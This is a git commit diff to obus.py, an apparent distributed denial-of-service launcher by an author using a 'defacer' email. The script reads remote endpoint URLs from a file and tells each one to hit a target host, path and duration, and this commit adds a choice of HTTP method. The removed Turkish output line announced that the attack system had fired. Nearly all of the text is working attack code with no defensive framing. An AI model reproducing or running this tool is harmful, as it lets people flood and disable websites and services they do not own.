b575acd6c4389227dc8f240796c65241437b7e96
Antidote <antidotedefacer@gmail.com>
2018-07-21 22:49:38 +0300

    New line
    Add new method ++

--- obus.py
+++ obus.py
@@ -1,4 +1,4 @@
-# exp: obus.py site.org index.php 9999
+# exp: obus.py site.org index.php 9999 GET|POST|PUT|DELETE|PATCH
 import grequests
 import sys
 obusv1 = """\
@@ -7,14 +7,14 @@ obusv1 = """\
       \ \  \o/
        \ \--'---_
        /\ \   / ~~\_
- ./---/__|=/_/------//~~~\               Coded By 4ntidot3
+ ./---/__|=/_/------//~~~\                       Coded By Antidote
 /___________________/O   O \              Using Python 2.7 & Grequests
 (===(\_________(===(Oo o o O)          
  \~~~\____/     \---\Oo__o--
    ~~~~~~~       ~~~~~~~~~~
 """
 print obusv1
-print("Saldiri Sistemi Ateslenmistir..")
+print("Starting System.")
 urls=[line.strip() for line in open('http.txt')]
-rs = (grequests.get(u+"?host="+sys.argv[1]+"&dizin="+sys.argv[2]+"&time="+sys.argv[3]) for u in urls)
+rs = (grequests.get(u+"?host="+sys.argv[1]+"&dizin="+sys.argv[2]+"&time="+sys.argv[3]+"&method="+sys.argv[4]) for u in urls)
 grequests.map(rs)
